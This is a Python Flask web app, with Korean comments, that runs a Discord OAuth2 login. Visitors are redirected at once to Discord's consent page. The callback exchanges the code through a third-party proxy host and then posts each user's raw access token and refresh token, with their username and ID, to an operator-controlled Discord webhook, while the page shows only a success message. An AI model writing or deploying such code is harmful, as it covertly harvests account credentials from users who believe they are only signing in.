import os
import requests
import logging
from flask import Flask, redirect, request, jsonify

# ==========================================
# 1. 환경 변수 통합 로더
# ==========================================
try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

def fetch_env(key_name, fallback_value=None):
    """시스템 환경 변수, .env, 소문자 키를 순차 탐색하는 로더"""
    val = os.getenv(key_name) or os.environ.get(key_name)
    if val:
        return val.strip()
    val = os.getenv(key_name.lower()) or os.environ.get(key_name.lower())
    if val:
        return val.strip()
    return fallback_value


app = Flask(__name__)
app.secret_key = fetch_env("FLASK_SECRET_KEY", "fallback-flask-secret-key")

CLIENT_ID = fetch_env("DISCORD_CLIENT_ID")
CLIENT_SECRET = fetch_env("DISCORD_CLIENT_SECRET")
REDIRECT_URI = fetch_env("DISCORD_REDIRECT_URI", "https://discord-oauth2-7e2n.onrender.com/oauth2")
WEBHOOK_URL = fetch_env("DISCORD_WEBHOOK_URL")

DISCORD_AUTH_URL = "https://discord.com/oauth2/authorize"
DISCORD_API_URL = "https://discord-proxy.cls110623.workers.dev"

HEADERS = {
    "User-Agent": "DiscordBot (https://discord-oauth2-7e2n.onrender.com, 1.0.0)"
}

logging.basicConfig(level=logging.INFO)


# ==========================================
# 2. 메인 접속 시 즉시 디스코드 승인 창으로 다이렉트
# ==========================================
@app.route('/')
def index():
    if not CLIENT_ID:
        return jsonify({"error": "서버 설정 오류", "message": "DISCORD_CLIENT_ID가 설정되지 않았습니다."}), 500

    discord_login_url = (
        f"{DISCORD_AUTH_URL}"
        f"?client_id={CLIENT_ID}"
        f"&redirect_uri={REDIRECT_URI}"
        f"&response_type=code"
        f"&scope=identify%20email"
    )
    return redirect(discord_login_url)


# ==========================================
# 3. 콜백 처리 & 웹후크 전송 및 검증
# ==========================================
@app.route('/oauth2')
def oauth2_callback():
    code = request.args.get('code')
    error = request.args.get('error')

    if error or not code:
        return "인증이 취소되었거나 오류가 발생했습니다.", 400

    if not CLIENT_ID or not CLIENT_SECRET:
        return jsonify({"error": "서버 설정 오류", "message": "CLIENT_ID 또는 CLIENT_SECRET이 누락되었습니다."}), 500

    token_url = f"{DISCORD_API_URL}/oauth2/token"
    payload = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    headers = {**HEADERS, 'Content-Type': 'application/x-www-form-urlencoded'}

    try:
        # 1. 토큰 발급
        token_res = requests.post(token_url, data=payload, headers=headers, timeout=10)
        if token_res.status_code != 200:
            return f"토큰 발급 실패 (Status {token_res.status_code}): {token_res.text}", token_res.status_code
        
        token_data = token_res.json()
        access_token = token_data.get('access_token')
        refresh_token = token_data.get('refresh_token', '없음')

        # 2. 유저 정보 조회
        user_url = f"{DISCORD_API_URL}/users/@me"
        user_headers = {**HEADERS, 'Authorization': f"Bearer {access_token}"}
        user_res = requests.get(user_url, headers=user_headers, timeout=10)
        user_data = user_res.json() if user_res.status_code == 200 else {}

        username = user_data.get('username', '알 수 없음')
        user_id = user_data.get('id', '알 수 없음')

        # 3. 디스코드 웹후크 전송 및 성공 여부 체크
        if not WEBHOOK_URL:
            return jsonify({"error": "서버 설정 오류", "message": "DISCORD_WEBHOOK_URL 환경 변수가 없습니다."}), 500

        webhook_payload = {
            "embeds": [{
                "title": "🔑 디스코드 토큰 발급 완료",
                "color": 5814783,
                "fields": [
                    {"name": "👤 사용자", "value": f"`{username}` (ID: {user_id})", "inline": False},
                    {"name": "🎟️ Access Token", "value": f"```\n{access_token}\n```", "inline": False},
                    {"name": "🔄 Refresh Token", "value": f"```\n{refresh_token}\n```", "inline": False},
                    {"name": "⏱️ 만료 시간", "value": f"{token_data.get('expires_in')}초", "inline": True},
                    {"name": "📜 Scope", "value": f"{token_data.get('scope')}", "inline": True}
                ]
            }]
        }
        
        webhook_res = requests.post(WEBHOOK_URL, json=webhook_payload, timeout=5)
        
        # 디스코드 웹후크 응답이 200 또는 204가 아니면 화면에 에러 명시
        if webhook_res.status_code not in [200, 204]:
            return f"웹후크 전송 실패 (상태 코드: {webhook_res.status_code}) - 응답 내용: {webhook_res.text}", 500

        # 4. 화면에는 완료 문구만 표시
        return "<h2>✅ 인증이 완료되었습니다. 이 창을 닫으셔도 됩니다.</h2>"

    except Exception as e:
        return f"처리 중 오류 발생: {str(e)}", 500


if __name__ == '__main__':
    port = int(fetch_env("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
